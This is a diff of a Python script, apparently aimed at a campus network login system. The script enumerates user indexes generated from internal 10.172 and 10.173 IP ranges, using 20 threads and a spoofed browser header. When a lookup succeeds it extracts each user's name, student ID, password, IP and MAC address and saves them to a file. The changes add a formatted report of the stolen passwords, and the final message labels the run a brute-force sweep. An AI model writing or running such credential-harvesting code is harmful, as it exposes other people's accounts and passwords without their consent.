@@ -9,7 +9,7 @@ class GetInfo(object):
             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"}
 
     def getinfo(self):
-        #print (self.url,self.headers,self.userIndex)
+        # print (self.url,self.headers,self.userIndex)
         res = requests.post(self.url, headers=self.headers, data={"userIndex": self.userIndex})
         res.encoding = "utf-8"
         return res.text
@@ -63,10 +63,18 @@ def run(gen):
         info = GetInfo(userIndex)
         infom = info.getinfo()
         print("[+] 正在尝试", userIndex, "\n")
-        # print(infom)
+        print(infom)
         if "获取用户信息失败" not in infom:
             print("[+] 获取用户信息成功")
-            print(infom)
+            #print(infom)
+
+            #正则生成报告
+            jsinfo = json.loads(infom)
+            result = "姓名：" + jsinfo["userName"] + "学号：" + jsinfo["userId"] + "密码：" + jsinfo["password"] + "ip：" + \
+                     jsinfo[
+                         "userIp"] + "mac：" + jsinfo["userMac"] + "服务：" + jsinfo["service"]
+            print("\n"+ result + "\n")
+
             with open("Success.txt", "a", encoding="utf-8") as file:
                 file.write(infom + "\n")
                 break
@@ -79,10 +87,6 @@ def test(userIndex):
 
 
 if __name__ == '__main__':
-    """
-        =======================设置区===========================
-    """
-
     # 线程数量
     threadNum = 20
     # 生成IP编码
@@ -94,9 +98,7 @@ if __name__ == '__main__':
         for ip3 in range(1, 3):  # ip第三个字段
             for ip2 in range(2, 4):  # 查询ip10.172和10.173
                 ident = code("10.17" + str(ip2) + "." + str(ip3) + "." + str(ip4))
-        """
-            =====================设置区结束==========================
-        """
+
         userIndex = userIndexGen(ident)
         # print(userIndex.__next__())
         threads = []
@@ -109,4 +111,4 @@ if __name__ == '__main__':
         thread.join()
 
     print()
-    print("[+] 已经爬取完成，结果保存在Success.txt")
+    print("[-] 遍历爆破完成，结果保存在Success.txt")
